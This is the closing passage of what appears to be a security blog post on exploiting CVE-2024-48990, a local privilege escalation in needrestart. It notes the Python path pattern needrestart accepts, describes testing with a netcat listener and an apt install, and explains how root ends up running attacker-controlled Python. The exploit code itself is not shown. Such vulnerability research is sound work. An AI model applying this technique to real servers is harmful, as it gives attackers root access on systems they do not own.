</span></span></code></pre></div><p><em>Note: Make sure that the python3 binary that you are running is located at a path that follows this regex pattern for <code>needrestart</code> to recognize it as a valid Python program: <code>^/usr/(local/)?bin/python([23][.\d]*)?$</code>.</em></p>
<p>Now, I will test the exploit by setting up a <code>nc</code> listener and attempting to install <code>curl</code> using <code>apt</code>!</p>
<video width="100%" controls>
    <source src="/videos/CVE-2024-48990_poc.mp4" type="video/mp4">
</video>
<p>It worked! We have successfully identified and exploited the n-day, CVE-2024-48990. In a real-world environment, it is likely that a system administrator or cron job would periodically perform library upgrades on the vulnerable server through a package manager. The package manager, with elevated privileges, would launch <code>needrestart</code>, which ends up scanning our attacker-controlled process and ultimately executing our desired Python code as root.</p>
<p>Thanks for reading!</p>
]]></content:encoded>
    </item>
  </channel>
</rss>
